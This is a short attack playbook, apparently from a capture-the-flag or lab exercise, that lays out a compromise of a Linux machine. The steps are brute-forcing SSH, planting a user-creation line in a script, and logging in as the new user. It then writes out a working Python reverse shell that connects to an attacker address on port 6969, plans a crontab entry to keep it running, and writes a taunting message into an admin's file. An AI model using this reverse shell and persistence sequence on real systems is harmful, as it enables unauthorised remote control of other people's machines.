#Brute Force SSH for user1

#Add create user line to Hello.sh

#Wait 6 seconds for user to be created

#Login as the new user

#Create python rev shell file
sudo bash -c 'printf "%s\n" "export RHOST=$ip;export RPORT=6969;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'" > sus.py'

#Add rev shell to crontab

#Adds text to admins donttouch.txt
sudo bash -c 'printf "%s\n" "I am in, you cannot find me" > /home/admin1/donttouch.txt'